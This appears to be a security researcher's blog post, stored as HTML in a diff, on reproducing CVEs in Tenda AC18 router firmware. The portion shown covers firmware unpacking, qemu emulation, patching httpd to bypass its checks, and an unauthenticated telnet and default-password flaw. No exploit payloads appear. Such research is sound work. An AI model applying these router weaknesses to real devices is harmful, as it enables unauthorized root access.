@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Objectives: Reverse engineering the firmware of Tenda AC18 AC1900 Smart Dual-Band Gigabit WiFi Router and reproduce some CVE vulnerabilities in the firmware.  Environment Set upRetrieve FirmwareDownlo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tenda AC18 AC1900 Router">
+<meta property="og:url" content="https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/index.html">
+<meta property="og:site_name" content="Thomason&#39;s Blog">
+<meta property="og:description" content="Objectives: Reverse engineering the firmware of Tenda AC18 AC1900 Smart Dual-Band Gigabit WiFi Router and reproduce some CVE vulnerabilities in the firmware.  Environment Set upRetrieve FirmwareDownlo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/assets/WriteFacMac_payload.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetSambaCfg_payload.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_code1.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_code2.png">
+<meta property="og:image" content="https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_poc.png">
+<meta property="article:published_time" content="2022-08-05T05:54:02.000Z">
+<meta property="article:modified_time" content="2022-08-05T06:08:01.773Z">
+<meta property="article:author" content="Thomason Zhao">
+<meta property="article:tag" content="CVE-2018-5767">
+<meta property="article:tag" content="CVE-2018-5768">
+<meta property="article:tag" content="CVE-2018-5770">
+<meta property="article:tag" content="CVE-2018-16334">
+<meta property="article:tag" content="CVE-2020-15916">
+<meta property="article:tag" content="CVE-2022-28556">
+<meta property="article:tag" content="CVE-2022-28557">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/assets/WriteFacMac_payload.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Tenda AC18 AC1900 Router</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+
+  <!-- fancybox support -->
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+  
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ThomasonZhao">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/08/02/Pwncollege-Summary/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&text=Tenda AC18 AC1900 Router"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&title=Tenda AC18 AC1900 Router"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&is_video=false&description=Tenda AC18 AC1900 Router"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tenda AC18 AC1900 Router&body=Check out this article: https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&title=Tenda AC18 AC1900 Router"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&title=Tenda AC18 AC1900 Router"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&title=Tenda AC18 AC1900 Router"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&title=Tenda AC18 AC1900 Router"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&name=Tenda AC18 AC1900 Router&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&t=Tenda AC18 AC1900 Router"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment-Set-up"><span class="toc-number">1.</span> <span class="toc-text">Environment Set up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Retrieve-Firmware"><span class="toc-number">1.1.</span> <span class="toc-text">Retrieve Firmware</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu-User-Mode-Emulation"><span class="toc-number">1.2.</span> <span class="toc-text">qemu User-Mode Emulation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu-System-Mode-Emulation"><span class="toc-number">1.3.</span> <span class="toc-text">qemu System-Mode Emulation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch-Executable-File"><span class="toc-number">1.4.</span> <span class="toc-text">Patch Executable File</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weak-Password"><span class="toc-number">2.</span> <span class="toc-text">Weak Password</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-5768-amp-CVE-2018-5770"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2018-5768 &amp; CVE-2018-5770</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Command-Injection"><span class="toc-number">3.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-16334"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2018-16334</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-15916"><span class="toc-number">3.2.</span> <span class="toc-text">CVE-2020-15916</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-28557"><span class="toc-number">3.3.</span> <span class="toc-text">CVE-2022-28557</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-Overflow"><span class="toc-number">4.</span> <span class="toc-text">Buffer Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-5767"><span class="toc-number">4.1.</span> <span class="toc-text">CVE-2018-5767</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-28556"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2022-28556</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Tenda AC18 AC1900 Router
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Thomason Zhao</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-05T05:54:02.000Z" itemprop="datePublished">2022-08-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CVE-Vulnerability/">CVE Vulnerability</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CVE-2018-16334/" rel="tag">CVE-2018-16334</a>, <a class="tag-link-link" href="/tags/CVE-2018-5767/" rel="tag">CVE-2018-5767</a>, <a class="tag-link-link" href="/tags/CVE-2018-5768/" rel="tag">CVE-2018-5768</a>, <a class="tag-link-link" href="/tags/CVE-2018-5770/" rel="tag">CVE-2018-5770</a>, <a class="tag-link-link" href="/tags/CVE-2020-15916/" rel="tag">CVE-2020-15916</a>, <a class="tag-link-link" href="/tags/CVE-2022-28556/" rel="tag">CVE-2022-28556</a>, <a class="tag-link-link" href="/tags/CVE-2022-28557/" rel="tag">CVE-2022-28557</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><strong>Objectives:</strong></p>
+<p>Reverse engineering the firmware of Tenda AC18 AC1900 Smart Dual-Band Gigabit WiFi Router and reproduce some CVE vulnerabilities in the firmware. </p>
+<h2 id="Environment-Set-up"><a href="#Environment-Set-up" class="headerlink" title="Environment Set up"></a>Environment Set up</h2><h3 id="Retrieve-Firmware"><a href="#Retrieve-Firmware" class="headerlink" title="Retrieve Firmware"></a>Retrieve Firmware</h3><p>Download <a target="_blank" rel="noopener" href="https://www.tendacn.com/us/download/detail-3852.html">router firmware</a> from Tenda’s official English website. </p>
+<p>Version number: V15.03.3.10_EN<br>Update Date: 2021&#x2F;2&#x2F;5</p>
+<p>Extract firmware from <code>.rar</code> package, then unpack the firmware with binwalk</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me AC18.bin</span><br></pre></td></tr></table></figure>
+
+<p>Go through the directory generated by binwalk, there exists a directory named <code>squashfs-root</code>, which is the file system of the router. </p>
+<h3 id="qemu-User-Mode-Emulation"><a href="#qemu-User-Mode-Emulation" class="headerlink" title="qemu User-Mode Emulation"></a>qemu User-Mode Emulation</h3><p><strong>Network configuration</strong></p>
+<p>The router’s <code>httpd</code> binary will check the IP address on <code>br0</code> device and listen on this IP to receive http request from the user. We have to make a virtual network bridge <code>br0</code> for it.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eth0 is the current network card</span></span><br><span class="line">sudo apt-get install bridge-utils</span><br><span class="line">sudo apt-get install uml-utilities</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 eth0</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo dhclient br0</span><br></pre></td></tr></table></figure>
+
+<p><strong>qemu setup</strong></p>
+<p>Install <code>qemu-user-satic</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-user-static</span><br></pre></td></tr></table></figure>
+
+<p>After installation, copy it to the directory under <code>squashfs-root</code>, then launch the httpd service. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-arm-static) ./qemu</span><br><span class="line"><span class="comment"># without gdb debugging</span></span><br><span class="line">sudo <span class="built_in">chroot</span> ./ ./qemu ./bin/httpd</span><br><span class="line"><span class="comment"># with gdb debugging on port 1234</span></span><br><span class="line">sudo <span class="built_in">chroot</span> ./ ./qemu -g 1234 ./bin/httpd</span><br></pre></td></tr></table></figure>
+
+<h3 id="qemu-System-Mode-Emulation"><a href="#qemu-System-Mode-Emulation" class="headerlink" title="qemu System-Mode Emulation"></a>qemu System-Mode Emulation</h3><p><strong>Network configuration</strong><br>Similar to the network configuration in user mode, after setup the network bridge <code>br0</code>, we need to create a device called <code>tap</code> which is used as an interface to connect to network bridge <code>br0</code>. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tap0    &lt;--br0 bridge--&gt;   eth0    ----&gt;    Internet</span><br></pre></td></tr></table></figure>
+
+<p>Here is the configuration script from the <a target="_blank" rel="noopener" href="https://wzt.ac.cn/2021/05/28/QEMU-networking/">reference_1</a> and <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231445#h2-3">reference_2</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setup bridge</span></span><br><span class="line">sudo ifconfig eth0 down</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 eth0</span><br><span class="line">sudo brctl stp br0 on</span><br><span class="line">sudo brctl setfd br0 2</span><br><span class="line">sudo brctl sethello br0 1</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up</span><br><span class="line">sudo ifconfig eth0 0.0.0.0 promisc up</span><br><span class="line">sudo dhclient br0</span><br><span class="line">sudo dhclient eth0</span><br><span class="line">sudo brctl show br0</span><br><span class="line">sudo brctl showstp br0</span><br><span class="line"></span><br><span class="line"><span class="comment"># set up tun/tap</span></span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo brctl addif br0 tap0</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up</span><br><span class="line">sudo ifconfig tap0 10.0.4.100/24 up</span><br><span class="line">sudo ifconfig tap0 netmask 255.255.252.0</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>
+
+<p><strong>Attention:</strong> Make sure your <code>eth0, br0, tap0</code> are all in the same network segment as shown below (<code>eth0</code> and <code>br0</code> may or may not have the same IP address):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">br0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.4.15  netmask 255.255.252.0  broadcast 10.0.7.255</span><br><span class="line">        inet6 fe80::5054:ff:fe69:5308  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 52:54:00:69:53:08  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 10605  bytes 2776827 (2.7 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 10598  bytes 2024056 (2.0 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">eth0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.4.15  netmask 255.255.252.0  broadcast 10.0.7.255</span><br><span class="line">        inet6 fe80::5054:ff:fe69:5308  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 52:54:00:69:53:08  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 5808990  bytes 1143337092 (1.1 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 5506112  bytes 906286000 (906.2 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 492973  bytes 46099384 (46.0 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 492973  bytes 46099384 (46.0 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">tap0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.4.100  netmask 255.255.252.0  broadcast 10.0.7.255</span><br><span class="line">        inet6 fe80::e008:89ff:fe7f:3e70  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether e2:08:89:7f:3e:70  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 33  bytes 7594 (7.5 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 1184  bytes 62110 (62.1 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
+
+<p><strong>qemu setup</strong></p>
+<p>Then we may start up the qemu system as our wish. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress</span><br><span class="line"></span><br><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> \</span><br><span class="line">-net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure>
+
+<p>After launch the qemu system emulation, don’t forget to set up IP address in the virtual machine also in the same network segment.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 10.0.4.76/24 up</span><br></pre></td></tr></table></figure>
+
+<p><strong>post setup</strong></p>
+<p>After setting up all network configurations, now is time to think about how to run the router firmware in the qemu system.</p>
+<p>We may first download gdbserver from <a target="_blank" rel="noopener" href="https://github.com/b0ldfrev/embedded-toolkit/tree/master/prebuilt_static_bins/gdbserver">github</a>if we would like to debug in the router. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># host machine</span></span><br><span class="line">tar -zcvf ./squashfs-root.tar.gz ./squashfs-root/</span><br><span class="line"></span><br><span class="line"><span class="comment"># virtual machine</span></span><br><span class="line">tar xzf squashfs-root.tar.gz &amp;&amp; <span class="built_in">rm</span> squashfs-root.tar.gz</span><br><span class="line">mount -o <span class="built_in">bind</span> /dev /root/squashfs-root/dev</span><br><span class="line">mount -t proc /proc /root/squashfs-root/proc</span><br><span class="line"><span class="built_in">chroot</span> /root/squashfs-root sh</span><br><span class="line"></span><br><span class="line">brctl addbr br0    </span><br><span class="line">ifconfig br0 10.0.4.76/24 up</span><br></pre></td></tr></table></figure>
+
+<h3 id="Patch-Executable-File"><a href="#Patch-Executable-File" class="headerlink" title="Patch Executable File"></a>Patch Executable File</h3><p>After launching the vulnerable service in <code>/bin/httpd</code>, we may see that it gets stuck after printing some welcome message. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Yes:</span><br><span class="line"></span><br><span class="line">      ****** WeLoveLinux****** </span><br><span class="line">      </span><br><span class="line">Welcome to ...</span><br></pre></td></tr></table></figure>
+
+<p>Search the string in IDA and locate at the function <code>sub_2DD04</code> (I rename it to <code>main</code> because it is the only function gets called in <code>_start</code> and <code>__uClibc_main</code>). qemu’s virtual network environment unable to pass the network check presented in the firmware (if failed, sleep forever), so we can just patch it to bypass. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// original</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\nYes:\n\n      ****** WeLoveLinux****** \n\n Welcome to ...&quot;</span>);</span><br><span class="line">  init_sig_handler();</span><br><span class="line">  <span class="keyword">while</span> (check_network((<span class="type">int</span>)v19) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// sleep forever</span></span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> (ConnectCfm(v4)) &#123;</span><br><span class="line">    <span class="comment">// continue</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// fail</span></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="comment">// patched</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\nYes:\n\n      ****** WeLoveLinux****** \n\n Welcome to ...&quot;</span>);</span><br><span class="line">  init_sig_handler();</span><br><span class="line">  check_network((<span class="type">int</span>)v19);                      <span class="comment">// patched, to bypass the checks</span></span><br><span class="line">  v4 = sleep(<span class="number">1u</span>);</span><br><span class="line">  ConnectCfm(v4);                               <span class="comment">// patched, to bypass the checks</span></span><br><span class="line">  <span class="comment">// continue</span></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+
+<p>Assembly:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">loc_2DDE8</span><br><span class="line">SUB             R3, R11, #-var_B4</span><br><span class="line">MOV             R0, R3</span><br><span class="line">BL              check_network</span><br><span class="line">MOV             R3, #1  ; Keypatch modified this from:</span><br><span class="line">                        ;   MOV R3, R0</span><br><span class="line">CMP             R3, #0</span><br><span class="line">BGT             loc_2DE0C</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">loc_2DE0C               ; seconds</span><br><span class="line">MOV             R0, #1</span><br><span class="line">BL              sleep</span><br><span class="line">BL              ConnectCfm</span><br><span class="line">MOV             R3, #1  ; Keypatch modified this from:</span><br><span class="line">                        ;   MOV R3, R0</span><br><span class="line">CMP             R3, #0</span><br><span class="line">BNE             loc_2DE3C</span><br></pre></td></tr></table></figure>
+
+<p>After patching the vulnerable executable file, we are still unable to access the web content because the <code>/webroot/</code> directory is empty. We have to migrate <code>/webroot_ro/</code> to <code>/webroot/</code>. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /webroot_ro/* /webroot/</span><br></pre></td></tr></table></figure>
+
+<p>Finally, we are good to go. </p>
+<h2 id="Weak-Password"><a href="#Weak-Password" class="headerlink" title="Weak Password"></a>Weak Password</h2><h3 id="CVE-2018-5768-amp-CVE-2018-5770"><a href="#CVE-2018-5768-amp-CVE-2018-5770" class="headerlink" title="CVE-2018-5768 &amp; CVE-2018-5770"></a>CVE-2018-5768 &amp; CVE-2018-5770</h3><p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2018-5770/">CVE-2018-5770</a> is an issue discovered on Tenda AC15, however, the service provider didn’t fix it in the firmware of AC18 devices 3 years after CVE disclosure. </p>
+<p>This vulnerability allows unauthenticated attackers to launch telnet service and connect it with the default password (addressed in <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2018-5768">CVE-2018-5768</a>) result owning root privilege of the router. </p>
+<p>In function <code>sub_41290</code>, we have a registering of handlers for different URLs to start different services, and one of them is telnet:</p>
